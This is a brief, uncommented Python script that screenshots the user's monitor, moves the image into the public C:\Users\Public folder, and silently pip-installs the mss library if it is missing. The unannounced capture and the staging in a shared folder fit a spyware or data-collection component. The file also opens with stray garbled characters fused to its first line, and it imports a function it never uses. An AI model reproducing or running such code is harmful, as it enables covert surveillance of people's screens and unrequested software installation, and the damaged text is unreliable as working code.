fpywXfrom subprocess import call
from os import getlogin
def shots():
    try:
        import mss
        with mss.mss() as scr:
            scr.shot()
        call(["move", "monitor-1.png", f"C:\\Users\\Public"], shell=True)

    except ModuleNotFoundError:

        call(["pip", "install", "mss"], shell=True)
        shots()
shots()